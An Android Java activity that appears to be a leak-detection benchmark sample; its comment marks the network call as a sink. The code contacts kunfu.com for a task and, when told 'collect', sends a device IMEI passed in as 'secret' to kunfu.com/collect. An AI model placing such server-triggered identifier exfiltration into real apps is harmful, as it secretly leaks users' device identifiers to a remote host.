package edu.ucdavis.netresponse;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Main2Activity extends AppCompatActivity {

    String imei = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        imei = getIntent().getExtras().getString("secret");

        Thread connectionThread = new Thread(new ConnectionThread("http://kunfu.com/task?q=", ""));
        connectionThread.start();
    }


    private class ConnectionThread implements Runnable {
        String data = "";
        String URL = "";

        public ConnectionThread(String URL, String data) {
            this.URL = URL;
            this.data = data;
        }

        @Override
        public void run() {
            try {
                connect(URL, data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private void connect(String URL, String data) throws IOException {
            URL = URL.concat(data);
            java.net.URL url = new URL(URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
            conn.setRequestMethod("GET");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();
            Log.d(getClass().getSimpleName(), URL);

            InputStream is = conn.getInputStream();
            if (is == null) {
                return;
            }
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String line;
            try {
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }
            } finally {
                br.close();
                is.close();
            }
            Log.d(getClass().getSimpleName(), sb.toString());

            if (sb.toString().startsWith("collect")) {
                Thread connectionThread = new Thread(new ConnectionThread("http://kunfu.com/collect?imei=", imei));
                connectionThread.start();
            }
        }
    }
}
